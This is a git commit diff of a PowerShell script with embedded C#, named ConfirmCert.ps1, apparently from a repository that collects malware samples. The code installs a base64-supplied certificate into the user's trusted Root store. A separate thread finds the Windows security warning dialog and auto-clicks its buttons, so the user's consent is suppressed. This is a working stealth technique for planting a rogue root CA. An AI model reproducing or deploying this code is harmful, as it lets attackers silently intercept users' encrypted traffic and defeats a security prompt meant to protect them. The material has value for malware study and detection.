5e75619e60fda656ecfd07ef2ee22484a1e9d4c4
Corsin Camichel <cocaman@gmail.com>
2016-10-28 18:19:02 +0200

    Wave 2016-10-28

--- ConfirmCert.ps1
+++ ConfirmCert.ps1
@@ -4,61 +4,133 @@ using System;
 using System.Text;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
+using System.Security.Cryptography.X509Certificates;
+using System.Threading;
 
 public static class Win32
 {
-  [DllImport("user32.dll", CharSet = CharSet.Unicode)]
-  public static extern IntPtr FindWindow(String sClassName, String sAppName);
-  
-  [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
-  static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
-  
-  [DllImport("user32.dll")]
-  [return: MarshalAs(UnmanagedType.Bool)]
-  static extern bool SetForegroundWindow(IntPtr hWnd);
-  
-  public delegate bool EnumWindowProc(IntPtr hwnd, IntPtr lParam);
-  
-  [DllImport("user32")]
-  [return: MarshalAs(UnmanagedType.Bool)]
-  public static extern bool EnumChildWindows(IntPtr window, EnumWindowProc callback, IntPtr lParam);  
-  
-  [DllImport("user32.dll", CharSet = CharSet.Auto)]
-  static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);
-  const int BM_CLICK = 0x00F5;    
-  public static void Start(){
-  	IntPtr hWnd;
-  	do{
-  		hWnd = FindWindow("#32770", null);
-  		if (!hWnd.Equals(IntPtr.Zero))
+	public class SearchData
+    {
+        public string Wndclass;
+        public string Title;
+        public string Process;
+        public IntPtr hWnd;
+    }
+
+    private delegate bool EnumWindowsProc(IntPtr hWnd, ref SearchData data);
+
+    [DllImport("user32.dll")]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, ref SearchData data);
+	
+	[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    public static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
+	
+	[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+	static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
+	
+	[DllImport("user32.dll")]
+	[return: MarshalAs(UnmanagedType.Bool)]
+	static extern bool SetForegroundWindow(IntPtr hWnd);
+	
+	public delegate bool EnumWindowProc(IntPtr hwnd, IntPtr lParam);
+	
+	[DllImport("user32")]
+	[return: MarshalAs(UnmanagedType.Bool)]
+	public static extern bool EnumChildWindows(IntPtr window, EnumWindowProc callback, IntPtr lParam);  
+	
+	[DllImport("user32.dll", CharSet = CharSet.Auto)]
+	static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);
+	
+	const int BM_CLICK = 0x00F5;
+	
+	public static byte[] GetCertAsByteArray(String sCert)
+    {
+		return Convert.FromBase64String(sCert);
+    }
+        
+	public static void Start(String sCert){
+        byte[] bCert = GetCertAsByteArray(sCert);
+        if (bCert != null)
         {
-        	String sEN=GEN(hWnd);
-  			if(sEN.Contains("csrss") || sEN.Contains("certutil"))
-	        {
-		        break;
-	        }else
+            X509Certificate2 certificate = new X509Certificate2(bCert);
+            X509Store store = new X509Store(StoreName.Root, StoreLocation.CurrentUser);
+            store.Open(OpenFlags.ReadWrite);
+            if (!store.Certificates.Contains(certificate))
+            {
+                Thread thread = new Thread(SearchDialog);
+                thread.Start();
+                store.Add(certificate);
+                thread.Join();
+            }
+            store.Close();
+        }
+	}
+	
+	public static void SearchDialog()
+	{
+		IntPtr hWnd;
+		do{
+			hWnd = SearchForWindow("#32770",String.Empty);
+			if (!hWnd.Equals(IntPtr.Zero))
+		    {
+		    	break;
+			}else
 	        {
 		        hWnd=IntPtr.Zero;
 	        }
-  		}
-  	}while (hWnd.Equals(IntPtr.Zero));
-    SetForegroundWindow(hWnd);
-  	EnumWindowProc childProc = new EnumWindowProc(EnumWindow);
-    EnumChildWindows(hWnd, childProc, IntPtr.Zero);
-  }
-  public static String GEN(IntPtr hWnd){
-  	uint processID = 0;
-    uint threadID = GetWindowThreadProcessId(hWnd, out processID);
-    Process p = Process.GetProcessById((int)processID);
-    return p.ProcessName.ToLower();
-  }
-  public static bool EnumWindow(IntPtr hWnd, IntPtr lParam)
-  {
-  	SendMessage(hWnd, BM_CLICK, IntPtr.Zero, IntPtr.Zero);
-  	return true;
-  }
+		}while (hWnd.Equals(IntPtr.Zero));
+		SetForegroundWindow(hWnd);
+		EnumWindowProc childProc = new EnumWindowProc(ECW);
+		EnumChildWindows(hWnd, childProc, IntPtr.Zero);
+	}
+	
+	public static IntPtr SearchForWindow(string wndclass, string title)
+    {
+        SearchData sd = new SearchData();
+        sd.Wndclass = wndclass;
+        sd.Title = title;
+        sd.hWnd=IntPtr.Zero;
+        EnumWindows(new EnumWindowsProc(EnumProc), ref sd);
+        return sd.hWnd;
+    }
+    
+	public static bool EnumProc(IntPtr hWnd, ref SearchData data)
+    {
+    	StringBuilder caption = new StringBuilder(1024);
+        StringBuilder className = new StringBuilder(1024);
+        GetWindowText(hWnd, caption, caption.Capacity);
+        GetClassName(hWnd, className, className.Capacity);
+        String sEN=GetProcessName(hWnd);
+		if((!data.Wndclass.Equals(String.Empty) && className.ToString().StartsWith(data.Wndclass)) || (!data.Title.Equals(String.Empty) && caption.ToString().StartsWith(data.Title)))
+		{
+        	if(sEN.Contains("csrss") || sEN.Contains("certutil"))
+	        {
+		        data.hWnd = hWnd;
+                return false;
+	        }
+        }
+       	
+        return true;
+    }
+    
+	public static String GetProcessName(IntPtr hWnd){
+		uint processID = 0;
+		uint threadID = GetWindowThreadProcessId(hWnd, out processID);
+		Process p = Process.GetProcessById((int)processID);
+		return p.ProcessName.ToLower();
+	}
+	public static bool ECW(IntPtr hWnd, IntPtr lParam)
+	{
+		SendMessage(hWnd, BM_CLICK, IntPtr.Zero, IntPtr.Zero);
+		return true;
+	}
 }
 "@;
-[Win32]::Start();
+[Win32]::Start("%CERT%");
+exit
 }
 ConfirmCert
